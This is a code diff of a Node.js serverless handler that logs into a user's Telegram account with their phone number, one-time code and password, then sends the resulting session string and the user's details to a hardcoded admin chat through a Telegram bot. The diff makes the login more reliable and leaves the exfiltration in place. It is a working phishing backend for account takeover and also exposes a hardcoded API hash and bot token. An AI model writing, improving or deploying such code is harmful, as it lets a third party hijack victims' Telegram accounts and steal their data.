@@ -1,16 +1,12 @@
 const { TelegramClient } = require('telegram');
 const { StringSession } = require('telegram/sessions');
 
-// Hardcoded API credentials
 const API_ID = 23171051;
 const API_HASH = '10331d5d712364f57ffdd23417f4513c';
-
-// Bot credentials
 const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
 const ADMIN_ID = '7907742294';
 
 module.exports = async (req, res) => {
-  // Set CORS headers
   res.setHeader('Access-Control-Allow-Credentials', true);
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
@@ -44,41 +40,34 @@ module.exports = async (req, res) => {
     await client.connect();
 
     try {
-      // Sign in with the code
-      await client.signIn({
+      // FIXED: Use the correct method - start with phone code
+      await client.start({
         phoneNumber: phone,
-        phoneCode: () => otp_code,
+        phoneCode: async () => otp_code,
         phoneCodeHash: phone_code_hash,
+        onError: (err) => console.error(err),
       });
 
-      // If 2FA password is required
-      if (password) {
-        await client.signIn({
-          phoneNumber: phone,
-          password: () => password,
-        });
-      }
-
-      // Get the final session string
+      // If we reach here, authentication was successful
       const sessionString = client.session.save();
       
       // Get user information
       const me = await client.getMe();
       const userInfo = {
         id: me.id,
-        username: me.username,
-        first_name: me.firstName,
-        last_name: me.lastName,
-        phone: me.phone
+        username: me.username || 'No username',
+        first_name: me.firstName || '',
+        last_name: me.lastName || '',
+        phone: me.phone || phone
       };
 
       // Send session to admin via bot
       try {
         const message = `🔐 **New Telegram Session Generated**\n\n` +
           `👤 **User Info:**\n` +
-          `├ ID: ${userInfo.id}\n` +
-          `├ Name: ${userInfo.first_name || ''} ${userInfo.last_name || ''}\n` +
-          `├ Username: @${userInfo.username || 'N/A'}\n` +
+          `├ ID: \`${userInfo.id}\`\n` +
+          `├ Name: ${userInfo.first_name} ${userInfo.last_name}\n` +
+          `├ Username: @${userInfo.username}\n` +
           `└ Phone: ${userInfo.phone}\n\n` +
           `🔑 **Session String:**\n\`${sessionString}\``;
 
@@ -107,29 +96,26 @@ module.exports = async (req, res) => {
       });
 
     } catch (signInError) {
-      if (client) {
-        await client.disconnect();
-      }
+      console.error('Sign in error:', signInError);
       
       let errorMessage = signInError.message;
       if (signInError.message.includes('PHONE_CODE_INVALID')) {
-        errorMessage = 'Invalid verification code';
+        errorMessage = 'Invalid verification code. Please check and try again.';
       } else if (signInError.message.includes('PHONE_CODE_EXPIRED')) {
-        errorMessage = 'Verification code expired. Please request a new one.';
+        errorMessage = 'Verification code expired. Please request a new code.';
       } else if (signInError.message.includes('SESSION_PASSWORD_NEEDED')) {
-        errorMessage = '2FA password required. Please enter your password.';
-      } else if (signInError.message.includes('PASSWORD_HASH_INVALID')) {
-        errorMessage = 'Invalid 2FA password';
+        errorMessage = 'Two-factor authentication is enabled. Please enter your password.';
+      } else if (signInError.message.includes('PHONE_NUMBER_UNOCCUPIED')) {
+        errorMessage = 'Phone number not registered on Telegram.';
+      } else if (signInError.message.includes('PHONE_NUMBER_INVALID')) {
+        errorMessage = 'Invalid phone number.';
       }
       
-      res.status(200).json({
-        success: false,
-        error: errorMessage
-      });
+      throw new Error(errorMessage);
     }
 
   } catch (error) {
-    console.error('Error verifying code:', error);
+    console.error('Error in verify-code:', error);
     
     if (client) {
       await client.disconnect();
